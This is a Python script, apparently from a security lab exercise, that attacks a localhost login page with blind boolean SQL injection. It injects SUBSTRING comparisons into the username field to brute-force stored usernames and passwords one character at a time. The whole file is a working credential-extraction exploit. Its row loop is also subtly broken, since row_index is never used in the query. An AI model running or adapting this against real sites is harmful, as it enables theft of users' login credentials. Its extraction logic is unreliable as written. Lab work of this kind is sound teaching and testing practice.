import requests
import string

URL = "http://localhost/lab09/login.php"

chars = string.ascii_letters + string.digits + string.punctuation

def is_true(payload):
    r = requests.get(URL, params=payload)
    return "user and password valid" in r.text

def extract_field(field_name, row_index, max_len=30):
    result = ""

    for i in range(1, max_len + 1):
        found = False

        for c in chars:
            injection = f"' OR SUBSTRING({field_name},{i},1)='{c}' -- "

            payload = {
                "u": injection,
                "p": "anything"
            }

            if is_true(payload):
                result += c
                print(f"[+] {field_name} so far: {result}")
                found = True
                break

        if not found:
            break

    return result


for row in range(1, 101):
    user = extract_field("username", row)
    pwd = extract_field("password", row)

    print(f"{row}: {user} / {pwd}")
